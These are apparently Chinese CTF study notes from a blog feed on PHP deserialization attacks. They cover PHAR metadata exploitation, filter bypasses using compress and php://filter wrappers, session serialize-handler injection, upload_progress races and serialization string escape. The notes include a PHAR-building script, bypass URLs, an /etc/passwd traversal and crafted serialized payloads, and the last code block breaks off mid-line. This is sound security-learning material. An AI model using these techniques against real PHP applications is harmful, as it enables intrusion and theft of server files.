title="what&amp;&amp;why"></a>what&amp;&amp;why</h3><ol><li>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</li><li><em><strong>文件格式</strong></em><ol><li>stub是一个文件标志，格式为: <code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，这里的xxx可以是任何内容，但是一定要有后面的<code>&lt;?...?&gt;</code>部分</li><li>manifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点</li><li>contents是被压缩的内容</li><li>signature签名，放在文件末尾</li></ol></li><li><em><strong>漏洞利用</strong></em><ol><li><em><strong>利用原理</strong></em>: 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行<strong>反序列化并完成对象的生命周期并销毁</strong> –&gt; 受影响函数如下<img src="/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/phar_affectedfunc.png" alt="受影响函数"></li><li>它有一个特性就是phar文件会以序列化的形式储存用户自定义的meta-data -&gt; <strong>配合phar:&#x2F;&#x2F;伪协议进行漏洞攻击</strong></li><li><em><strong>利用条件</strong></em><ol><li>Phar需要 PHP &gt;&#x3D; 5.2</li><li>phar可以上传到服务器端(存在文件上传)</li><li>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数后类中要有可用的方法&#x2F;魔术方法作为”跳板”。</li><li>文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤</li></ol></li></ol></li></ol><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ol><li>S1: 生成phar文件<ol><li>需要在生成phar文件需要修改php.ini中的配置，将phar.readonly设置为Off</li><li><code>__HALT_COMPILER();</code>必须大写，小写不会被识别出来。导致无法进行反序列化操作。</li><li>上传时将test.phar修改文件扩展名为jpg也可以进行反序列化，不会影响解析，<strong>但是生成时需要使用phar后缀</strong>，魔术头可以随便加</li></ol></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">targetClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里的targetClass一般是攻击文件中含有的类，存在数据的利用点</span></span><br><span class="line">    <span class="variable">$someProperty</span> = <span class="string">&quot;phpinfo();&quot;</span>;   <span class="comment">// 传到目标类的sink里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;whateveryouwant&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">targetClass</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>); <span class="comment">//将自定义的meta-data存入manifest，这一步注入攻击</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;flag&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Phar绕过技巧"><a href="#Phar绕过技巧" class="headerlink" title="Phar绕过技巧"></a>Phar绕过技巧</h3><ol><li><p>文件尾phar关键字绕过</p><ol><li>Solution: 由于php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件</li><li>还可以加上魔术头在<code>$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</code></li></ol></li><li><p>伪协议phar过滤绕过</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 注意到这里只是开头</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,$filename)&#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Solution</span></span><br><span class="line">    <span class="comment"># Bzip / Gzip</span></span><br><span class="line">    <span class="comment"># 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span></span><br><span class="line">    compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">    compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line">    compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line"></span><br><span class="line">    php://<span class="built_in">filter</span>/resource=phar:///test.phar/test.txt</span><br><span class="line">    <span class="comment"># 还可以使用伪协议的方法绕过</span></span><br><span class="line">    php://<span class="built_in">filter</span>/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></li><li><p>绕过<code>__HALT_COMPILER</code>特征检测</p><ol><li><p>因为phar中的a stub字段必须以<code>__HALT_COMPILER();</code>字符串来结尾，否则phar扩展将无法识别这个文件为phar文件，所以这段字符串不能省略，只能绕过</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;/?|php|HALT_COMPILER/i&quot;</span>,<span class="variable">$filename</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>Solution1: Gzip</strong></em></p><ol><li>首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了__HALT_COMPILER()，将 phar.gz 后缀改为 png（png文件可以上传），<em><strong>target:</strong></em> <code>?filename=phar://pic/phar.phar.gz/phar.phar</code> –&gt; 直接通过phar协议即可</li></ol></li><li><p><em><strong>Solution2: zip</strong></em></p><ol><li>将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则</li></ol>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar_file</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);   <span class="comment">// 你的攻击点对象，$exp是可以利用的类</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phar_file</span>;</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>); </span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;crispr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);    <span class="comment">// 不重要</span></span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$phar_file</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入?file=phar://phar.zip//phar.phar</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>Solutions</strong></em></p><ol><li>前文说到，将phar包压缩成gzip仍然能够触发反序列化，并且将phar写入到zip注释中也同样能达到如上的效果,其实并不只有这些，将Phar压缩成tar、gzip、bzip2后均能够触发反序列化</li><li>具体原因见ref中的链接，你看得到的</li></ol></li></ol></li></ol><h3 id="Phar例题"><a href="#Phar例题" class="headerlink" title="Phar例题"></a>Phar例题</h3><h4 id="Phar例1-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#Phar例1-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="*Phar例1:[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>*Phar例1:[CISCN2019 华北赛区 Day1 Web1]Dropbox</h4><h5 id="Dropbox-Ref"><a href="#Dropbox-Ref" class="headerlink" title="Dropbox Ref"></a>Dropbox Ref</h5><ol><li><a href="https://blog.csdn.net/xxy605/article/details/120172274">很不错的题解</a></li></ol><h5 id="Phar例1思考与尝试-Failed"><a href="#Phar例1思考与尝试-Failed" class="headerlink" title="Phar例1思考与尝试(Failed)"></a>Phar例1思考与尝试(Failed)</h5><ol><li>扫目录没有，目录遍历试试：filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，可读</li><li>读源码审计阶段<ol><li>Class.php<ol><li>User类大部分依赖mysqli，预处理，不考虑sql注入，这里是以<strong>root权限</strong>进行连接的</li><li>这一道题注重于文件操作？与文件操作有关？<ol><li>File通过open设置指向的filename，并通过其他函数获取信息，close()时读取文件内容</li><li>FileList中files数组中存放着当前目录下的文件<ol><li>当尝试调用一个未定义或不可访问的方法时，<code>__call()</code>会被自动调用</li></ol></li></ol></li></ol></li><li>Upload.php<ol><li>会将文件进行移动</li><li>filename长度进行了限制</li></ol></li><li>login.php和register.php一起的<ol><li>直接知道沙箱的路径</li></ol></li><li>download.php<ol><li>对&#x2F;flag进行了过滤</li></ol></li></ol></li><li>这里应该是要进行rce，找找可控输入，download.php中的filename连接到了class.php中file的get_file_contents()，敏锐phar反序列化，<ol><li>get_file_contents中使用，下面略<ol><li>没有问题的，download中有include class.php，可以实现直接调用并在<code>__destruct()</code>函数输出result的结果，现在的重点在于调用想要的函数</li></ol></li><li>应为flag给我们过滤了，额日期额设置了open_basedir，需要是在新进程中<ol><li>一个新的File对象，filename是flag，然后通过调用close进行读取flag内容</li><li>上传的名称是自定义的，上传一个&#x2F;flag的文件？，通过FileList的<code>__construct</code>创建对象？不行，需要wakeup，只能同故宫<code>__destruct</code>了</li></ol></li></ol></li><li>没想出来，感觉有遗漏的点，看看题解先，看完题解，还得练，已经在进步了 –&gt; 要不是太困可能还真想得出来，但是这里跑偏了</li></ol><h5 id="Phar例1fix"><a href="#Phar例1fix" class="headerlink" title="*Phar例1fix"></a>*Phar例1fix</h5><blockquote><p>上面思路方向是对，但是偏的有点严重了，重新来一下</p></blockquote><ol><li><em><strong>这里应该从宏观出发</strong></em></li><li>最终是要获取&#x2F;flag.php或者&#x2F;flag.txt这样，这里没有自定义函数，应该是到不了rce的地步，直接读文件的话</li><li>寻找<em><strong>可控输入点</strong></em><ol><li>download.php中的filename</li><li>delete.php中的filename</li></ol></li><li>这里因为download中有ini_set的open_basedir，所以似乎读不了，会被限制住，在include的class.php中也有，根本无法读</li><li>先从文件出发吧，有download.php的get_file_contents不行的话，就只有File的close方法了，这里要求有一个File对象的filename是&#x2F;flag.txt这样还需要调用close方法？<ol><li>phar get_file_contents中反序列化自定义，有open_basedir不行</li><li>phar unlink中也可以反序列化自定义 –&gt; <em><strong>phar出发函数不知一个</strong></em></li></ol></li><li>观察到另一个close的话是User里的了，通过设置User的对应属性是一个File对象可以吗，可以的，调用close方法，只有返回没有输出，还有FileList类啊，有<code>__destruct</code>可以输出通过FileList调用的File函数的返回内容 –&gt; User -&gt; FileList: <code>close</code> -&gt; File: <code>close</code> -&gt; FileList: <code>__destruct</code></li><li>最终payload见src&#x2F;Dropbox&#x2F;payload.php</li></ol><h5 id="Phar例1总结"><a href="#Phar例1总结" class="headerlink" title="*Phar例1总结"></a>*Phar例1总结</h5><ol><li><em><strong>思路上</strong></em><ol><li>这里从读&#x2F;flag为<strong>目标导向</strong>逆向推理比较容易出思路</li><li>遇到不行的就不要硬啃绕，<strong>改改方向</strong>，不要被openbasedir绕晕了，可能可行说明思路正确，可以找找有没有其他切入口</li><li>确定反序列化后先找<strong>利用链</strong>，这里就是你的目标</li></ol></li></ol><h4 id="Phar例2-CTFshow-web-phar-条件竞争"><a href="#Phar例2-CTFshow-web-phar-条件竞争" class="headerlink" title="Phar例2:[CTFshow web]phar+条件竞争"></a>Phar例2:[CTFshow web]phar+条件竞争</h4><h2 id="SESSION利用"><a href="#SESSION利用" class="headerlink" title="SESSION利用"></a>SESSION利用</h2><h3 id="SESSION-ref"><a href="#SESSION-ref" class="headerlink" title="SESSION ref"></a>SESSION ref</h3><ol><li><a href="https://www.freebuf.com/articles/web/324519.html">原理解释文章，不错</a></li><li><a href="https://github.com/H3rmesk1t/Security-Learning/blob/main/PHPSec/PHP%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/PHP%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md">手法文章</a></li><li><a href="https://xz.aliyun.com/t/9545?u_atoken=fa62980e2dfa7fc7b58663cfdf79c129&u_asig=1a0c399a17310284686373678e00cd">手法和上文一样，但是又例题</a></li></ol><h3 id="PHP中的session工作流程"><a href="#PHP中的session工作流程" class="headerlink" title="PHP中的session工作流程"></a>PHP中的session工作流程</h3><p><img src="/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/session_workflow.png!small" alt="工作流程"></p><ol><li>S1: PHP脚本使用 session_start()时开启session会话，会自动检测PHPSESSID，初始化超全局变量$_SESSION为一个空数组<ol><li>如果Cookie中存在，获取PHPSESSID</li><li>如果Cookie中不存在，创建一个PHPSESSID，并通过响应头以Cookie形式保存到浏览器</li><li>有时候浏览器用户设置会禁止 cookie，当在客户端cookie被禁用的情况下，php也可以自动将session id添加到url参数中以及form的hidden字段中，但这需要将php.ini中的session.use_trans_sid设为开启，也可以在运行时调用ini_set来设置这个配置项</li></ol></li><li>S2: PHP通过PHPSESSID去指定位置（PHPSESSID文件存储位置）匹配对应的文件<ol><li>存在该文件：读取文件内容（通过反序列化方式），将数据存储到$_SESSION中</li><li>不存在该文件： session_start()创建一个PHPSESSID命名文件</li></ol></li><li>S3: 程序执行结束，将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中</li><li><em><strong>seesion_start()</strong></em><ol><li>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。</li><li>如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</li></ol></li></ol><h3 id="SESSION信息存储与配置"><a href="#SESSION信息存储与配置" class="headerlink" title="_SESSION信息存储与配置"></a>_SESSION信息存储与配置</h3><ol><li><p>常见的php-session存放位置有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、/var/lib/php5/sess_PHPSESSID</span><br><span class="line">2、/var/lib/php7/sess_PHPSESSID</span><br><span class="line">3、/var/lib/php/sess_PHPSESSID</span><br><span class="line">4、/tmp/sess_PHPSESSID 5 /tmp/sessions/sess_PHPSESSED</span><br><span class="line">5、phpstudy集成环境下在php.ini里查找session.save_path，也可以在这里更改路径</span><br></pre></td></tr></table></figure></li><li><p>php_ini中</p><ol><li>比较重要的几个<ol><li><code>session.save_path=&quot;/tmp&quot;</code></li><li><code>session.serialize_handler=php</code>，这个一共有三个选项，见下</li></ol></li></ol></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=<span class="string">&quot;/tmp&quot;</span>      --设置session文件的存储位置，读取_SESSIOIN的时候进行加载</span><br><span class="line">session.save_handler=files    --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.auto_start= <span class="number">0</span>          --指定会话模块是否在请求开始时启动一个会话，默认值为 <span class="number">0</span>，不启动</span><br><span class="line">session.serialize_handler= php --定义用来序列化/反序列化的处理器名字，默认使用php</span><br><span class="line">session.upload_progress.enabled= On --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line">session.upload_progress.cleanup= oN --读取所有POST数据（即完成上传）后立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure><h3 id="SESSION序列化与反序列化"><a href="#SESSION序列化与反序列化" class="headerlink" title="_SESSION序列化与反序列化"></a>_SESSION序列化与反序列化</h3><ol><li>$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中，使用的三种不同的处理格式，即session.serialize_handler定义的三种引擎<ol><li><em><strong>默认值问题</strong></em><ol><li>PHP 5.5.4 之前：默认值是 php，即使用<code>|</code>进行分隔</li><li>PHP 5.5.4 及之后：引入了php_serialize，但是默认值还是 php，官方文档</li></ol></li></ol></li><li><em><strong>注意点</strong></em><ol><li>在重新访问时，如果存在PHPSESSID，则会读取sess_{PHPSESSID}文件中保存的序列化_SESSION，按照格式进行反序列化</li></ol></li></ol><blockquote><p>php_serialize就是普通直接进行seriablize()的形式，其他两种不太一样<br>php_binary中的#时长度的ascii字符</p></blockquote><table><thead><tr><th>处理器</th><th>存储格式</th><th>例子</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过 serialize() 函数反序列处理的值</td><td>username|s:11:”whatcanisay”;passwd|s:6:”114514”;</td></tr><tr><td>php_serialize (php&gt;&#x3D;5.5.4)</td><td>经过 serialize() 函数反序列处理的数组</td><td>a:1:{s:7:”session”;s:7:”xianzhi”;}</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数反序列处理的值</td><td>#sessionsessionsessionsessionsessions:7:”xianzhi”;</td></tr></tbody></table><h3 id="SESSION-exp"><a href="#SESSION-exp" class="headerlink" title="SESSION exp"></a>SESSION exp</h3><ol><li><em><strong>前提</strong></em><ol><li><strong>大前提</strong>：还是需要php给定targetClass的利用函数，像是魔术方法这些的调用链</li><li>利用场景<ol><li><em><strong>不同引擎解析注入</strong></em>: 写入时使用php serialize方式，注入|分隔，读取时使用php方式，可以反序列化我们想要的任意对象<ol><li>在php方式中，|前面都会认为时键名</li></ol></li><li><em><strong>当没有可以控制的键值对时: session.upload_progress</strong></em>: 自控键值对<ol><li><strong>利用条件</strong><ol><li>upload_progress是php&gt;&#x3D;5.4后开始添加的一个特性</li></ol></li><li>注意到<code>session.upload_progress.enabled</code>，启用上传进度跟踪，并填充$ _SESSION变量，默认启用，注意到还有<code>session.upload_progress.cleanup</code>读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用；还有默认情况下，<code>session.use_strict_mode</code>值是0，此时用户是可以自己定义Session ID的，这里无伤大雅，只是注意<strong>可以自定义sess文件名</strong></li><li><img src="/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/session_uploadprogress.png" alt="php官方文档"><ol><li><a href="https://www.php.net/manual/zh/session.upload-progress.php">详细信息如键值对上链接</a></li></ol></li><li><strong>手法</strong>: ，利用PHP_SESSION_UPLOAD_PROGRESS上传文件，其中利用文件名可控，从而构造恶意序列化语句并写入session文件，这里由于<code>session.upload_progress.cleanup</code>默认开启，需要竞争<ol><li>PHPSESSID必须要有，因为要竞争同一个文件</li><li>filename可控，但是在值的最前面加上|,因为最终目的是利用session的反序列化，PHP_SESSION_UPLOAD_PROGRESS只是个跳板；其次把字符串中的双引号转义，以防止与最外层的双引号冲突</li><li>上传的文件要大些，否则很难竞争成功；写入f &#x3D; io.BytesIO(b’a’ * 1024 10241)</li><li><img src="/pic/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/session_upload_progress_name.png" alt="手法"></li></ol></li></ol></li><li><em><strong>文件包含 session.upload_progress</strong></em><ol><li>原理和上述类似，这里直接手法：恶意语句写入文件然后竞争包含即可，这里的session文件其实只是做载体</li></ol></li></ol></li></ol></li></ol><h3 id="SESSION-例题"><a href="#SESSION-例题" class="headerlink" title="SESSION 例题"></a>SESSION 例题</h3><h4 id="强网杯24-platform"><a href="#强网杯24-platform" class="headerlink" title="[强网杯24]platform"></a>[强网杯24]platform</h4><ol><li>具体内容见单独的题解ctrl+f，有另写一篇博客</li></ol><h4 id="巅峰极客2019-LOL"><a href="#巅峰极客2019-LOL" class="headerlink" title="[巅峰极客2019]LOL"></a>[巅峰极客2019]LOL</h4>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> all in one </tag>
            
            <tag> php serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化字符逃逸</title>
      <link href="/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
      <url>/2024/11/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>自从去年接触newstar的那道pop链后就没有再接触php反序列化了，刚好遇到qwb24的platform那就来复习一下</p></blockquote><h2 id="UNSOVLED"><a href="#UNSOVLED" class="headerlink" title="UNSOVLED"></a>UNSOVLED</h2><ol><li>extract()</li><li>序列化后各个属性的排列顺序</li><li>总结以下</li><li>字符串增加构造那一步还没有解决</li></ol><h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><ol><li><em><strong>目的</strong></em>: php反序列化的字符串绕过最终目的是要实现对不可设置变量的控制(无法直接控制序列化字符串)，或者说构造成功后可以在从<strong>故意的被替换变量后实现对序列化字符串的完全控制</strong>，以两道例题为例<ol><li>[安洵杯 2019]easy_serialize_php中通过user的被替换来通过function构造特殊值实现user变量后对序列化字符串的完全掌控</li></ol></li><li><em><strong>注意点与前提</strong></em><ol><li>字符串减少类型中，一般需要两个变量来实现，一个进行过滤构造如user(需要不会被用的，因为构造后一般血肉模糊了)，如例题中的function</li><li>注意反序列化覆盖的情况会<strong>根据需构造控制的变量的位置不同</strong>，具体进行观察</li></ol></li><li><em><strong>一些技巧</strong></em><ol><li>python len()获取长度很快</li><li>反序列化以长度为值标识，并不是以引号的，但是<strong>会在每一个值加上双引号</strong>，在构造时要注意是要算上引号的</li></ol></li><li><em><strong>出现原因与底层原因</strong></em><ol><li>反序列化的过程中必须严格按照序列化规则才能成功实现反序列化：<strong>长度</strong>和<strong>数量</strong></li><li>php字符串序列化是以<code>;&#125;</code>结尾的，对象序列化是直接<code>&#125;</code>结尾，并通过长度与<code>&#125;</code>来判断范围而不是引号<code>&#39;&quot;</code>的闭合 -&gt; <code>a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&#39;mikasa&#39;;&#125;abc</code>长度到达且<code>&#125;</code>闭合外部的字符不对反序列化产生影响</li></ol></li></ol><h2 id="字符串增加"><a href="#字符串增加" class="headerlink" title="字符串增加"></a>字符串增加</h2><h3 id="基础梳理"><a href="#基础梳理" class="headerlink" title="+基础梳理"></a>+基础梳理</h3><ol><li><strong>构造长度</strong>: 由于长度不变但是实际内容替换边长会包含过少内容，利用长度尾部<code>&#125;</code>闭合的特性，通过 –&gt; 尾部<code>&#125;</code>截断多余部分</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxx&quot;</span>xx<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">&#123;s:4:&quot;</span>user<span class="string">&quot;;s:6:&quot;</span>yyyyyy<span class="string">&quot;yyyy&quot;</span>&#125;</span><br><span class="line">a:<span class="number">4</span>:&#123;whatever;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>&#125;    <span class="comment">// 注意这里a需要4个元素，并且使用了数组绕过</span></span><br><span class="line"><span class="comment">// 只需要n2=n1-1即可构造，对于*2字符来说的情况下</span></span><br><span class="line"><span class="comment">// 对于5-&gt;6 符也符合上市，n1表示个数，n2表示字符数</span></span><br><span class="line">&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;where&quot;</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">&#123;s:4:&quot;</span>user<span class="string">&quot;;s:6:&quot;</span>hacker<span class="string">&quot;&quot;</span>;&#125;  <span class="comment">// 多出来一个&quot;成功逃逸</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// origin2</span></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// target2</span></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造</span></span><br><span class="line"></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;where&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">1</span>:<span class="string">&quot;where&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1@1.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span 